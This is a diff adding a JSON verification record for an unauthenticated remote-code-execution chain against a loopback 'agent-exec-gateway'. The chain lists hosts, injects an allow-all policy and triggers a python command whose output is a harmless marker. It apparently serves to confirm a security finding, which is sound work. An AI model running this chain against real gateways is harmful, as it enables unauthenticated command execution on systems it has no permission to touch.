@@ -1,0 +1,24 @@
+{
+  "schemaVersion": "1.0.0",
+  "id": "v-agent-exec-gateway-rce-chain",
+  "title": "agent-exec-gateway unauthenticated RCE chain (3-step, local host)",
+  "claim": "A 3-step unauthenticated chain on a loopback agent-exec-gateway (127.0.0.1:8000): list hosts -> inject allow-all policy -> trigger execution on 'local' host -> read marker from stdout. Confirms arbitrary command execution without authentication.",
+  "family": "http_chain",
+  "soundness": "sound",
+  "ceiling": "Loopback-only; does NOT establish remote exploitability (host must be on 0.0.0.0 per deployment for a remote attacker).",
+  "isolation": "loopback",
+  "cost": { "budget": "3 requests", "gated": true, "timeoutMs": 15000 },
+  "base": "http://127.0.0.1:8000",
+  "oracle": {
+    "mode": "steps",
+    "steps": [
+      { "request": { "method": "GET", "path": "/api/hosts" }, "expect": "200", "save": "hosts", "name": "list_hosts" },
+      { "request": { "method": "POST", "path": "/api/policies", "body": { "client": "*", "host": "*", "command": "*", "args_prefix": [], "decision": "allow" } }, "expect": "201", "save": "policy", "name": "inject_policy" },
+      { "request": { "method": "POST", "path": "/api/executions", "body": { "host": "local", "argv": ["python", "-c", "print('__AEG_RCE_VERIFY_44e6f8__')"], "cwd": null } }, "expect": "200", "save": "exec", "name": "trigger_exec" },
+      { "request": { "method": "GET", "path": "/api/executions/{exec.id}" }, "expect": "200", "save": "final", "name": "read_stdout" }
+    ],
+    "evidence": "__AEG_RCE_VERIFY_44e6f8__ in {final.body.stdout}",
+    "markers": { "unauth_api": "step0.expect_ok", "policy_bypass": "step1.expect_ok", "trigger_ok": "step2.expect_ok" }
+  },
+  "pass": { "mode": "chain" }
+}
